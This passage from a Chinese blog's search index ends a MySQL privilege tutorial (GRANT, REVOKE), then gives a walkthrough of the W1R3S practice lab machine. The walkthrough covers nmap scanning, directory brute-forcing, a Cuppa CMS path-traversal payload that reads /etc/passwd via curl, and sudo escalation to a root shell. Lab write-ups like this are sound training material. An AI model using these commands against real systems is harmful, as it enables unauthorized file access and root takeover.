alt=\"image-20230309092308658\"></p>\n<p>1). 查询权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SHOW GRANTS FOR &#x27;用户名&#x27;@&#x27;主机名&#x27; ;</span><br></pre></td></tr></table></figure>\n\n<p>2). 授予权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">GRANT 权限列表 ON 数据库名.表名 TO &#x27;用户名&#x27;@&#x27;主机名&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>3). 撤销权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">REVOKE 权限列表 ON 数据库名.表名 FROM &#x27;用户名&#x27;@&#x27;主机名&#x27;;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">注意事项：</span><br><span class=\"line\">• 多个权限之间，使用逗号分隔</span><br><span class=\"line\">• 授权时， 数据库名和表名可以使用 * 进行通配，代表所有。</span><br></pre></td></tr></table></figure>\n\n<p>案例:</p>\n<p>A. 查询 ‘heima‘@’%’ 用户的权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">show grants for &#x27;heima&#x27;@&#x27;%&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>B. 授予 ‘heima‘@’%’ 用户itcast数据库所有表的所有操作权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">grant all on itcast.* to &#x27;heima&#x27;@&#x27;%&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>C. 撤销 ‘heima‘@’%’ 用户的itcast数据库的所有权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">revoke all on itcast.* from &#x27;heima&#x27;@&#x27;%&#x27;;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h1><p>函数 是指一段可以直接被另一段程序调用的程序或代码。</p>\n","tags":["mysql"]},{"title":"靶机玩耍","url":"/2023/03/16/%E9%9D%B6%E6%9C%BA%E7%8E%A9%E8%80%8D/","content":"<h2 id=\"W1R3S\"><a href=\"#W1R3S\" class=\"headerlink\" title=\"W1R3S\"></a>W1R3S</h2><p>获得靶机IP（记得kali、靶机网络都改桥接）得到ip 192.168.1.28</p>\n<h3 id=\"nmap-扫服务\"><a href=\"#nmap-扫服务\" class=\"headerlink\" title=\"nmap 扫服务\"></a>nmap 扫服务</h3><p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316092242512.png\" alt=\"image-20230316092242512\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo nmap --min-rate 10000  -p-  192.168.1.28      （全面的扫描端口）</span><br><span class=\"line\">sudo nmap -sT -sV -O -p21,22,80,3306 192.168.1.28 （扫描对应端口获取详细信息）（TCP扫描）</span><br><span class=\"line\">    PORT     STATE SERVICE VERSION</span><br><span class=\"line\">    21/tcp   open  ftp     vsftpd 2.0.8 or later</span><br><span class=\"line\">    22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class=\"line\">    80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class=\"line\">    3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class=\"line\">    10123/tcp open  unknown</span><br><span class=\"line\">    MAC Address: 00:0C:29:A0:15:2E (VMware)</span><br><span class=\"line\">    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class=\"line\">    Device type: general purpose</span><br><span class=\"line\">    Running: Linux 3.X|4.X|5.X</span><br><span class=\"line\">    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5.1</span><br><span class=\"line\">    OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9, Linux 5.1</span><br><span class=\"line\">    Network Distance: 1 hop</span><br><span class=\"line\">    Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class=\"line\">    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class=\"line\">    Nmap done: 1 IP address (1 host up) scanned in 13.06 seconds</span><br><span class=\"line\">sudo nmap -sU -p21,22,80,3306 192.168.1.28 （udp扫描）//记住还可以扫IPV6</span><br><span class=\"line\">sudo nmap --script=vuln -p21,22,80,3306 192.168.1.28  //（扫描插件漏洞） </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"访问ftp\"><a href=\"#访问ftp\" class=\"headerlink\" title=\"访问ftp\"></a>访问ftp</h3><p>匿名 （获得对应文件）（命令行访问记得输入binary命令，防止破坏可执行文件）</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316092603021.png\" alt=\"image-20230316092603021\"></p>\n<h3 id=\"访问web\"><a href=\"#访问web\" class=\"headerlink\" title=\"访问web\"></a>访问web</h3><h4 id=\"目录爆破：dirb、gobuster、feroxbuster\"><a href=\"#目录爆破：dirb、gobuster、feroxbuster\" class=\"headerlink\" title=\"目录爆破：dirb、gobuster、feroxbuster\"></a>目录爆破：dirb、gobuster、feroxbuster</h4><p>使用dirb爆破找到<a href=\"http://192.168.1.28/administrator/installation/\">http://192.168.1.28/administrator/installation/</a></p>\n<p>数据库创建失败</p>\n<p>开始看cms（cuppa）有漏洞没有</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">searchsploit cuppa</span><br><span class=\"line\">searchsploit  cuppa cms -m 25791  </span><br><span class=\"line\">cat 25971.txt</span><br></pre></td></tr></table></figure>\n\n<p>访问<a href=\"http://192.168.1.28/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd%E5%A4%B1%E8%B4%A5\">http://192.168.1.28/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd失败</a></p>\n<p><a href=\"http://192.168.1.28/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd\">http://192.168.1.28/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a> 失败</p>\n<p><a href=\"http://192.168.1.28/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd\">http://192.168.1.28/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a> 成功显示（但没有东西）</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl    --data-urlencode urlConfig=../../../../../../../../../etc/passwd  http://192.168.1.28/administrator/alerts/alertConfigField.php  （需要post）</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"权限维持\"><a href=\"#权限维持\" class=\"headerlink\" title=\"权限维持\"></a>权限维持</h3><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">whoami</span><br><span class=\"line\">uname -a</span><br></pre></td></tr></table></figure>\n\n<p>sudo 提权</p>\n<p>可以ftp提权，也可以sudo &#x2F;bin&#x2F;bash，也可也sudo time &#x2F;root&#x2F;flag.txt</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316093047508.png\" alt=\"image-20230316093047508\"></p>\n<p>成功</p>\n","tags":["vulhub靶机 渗透"]}]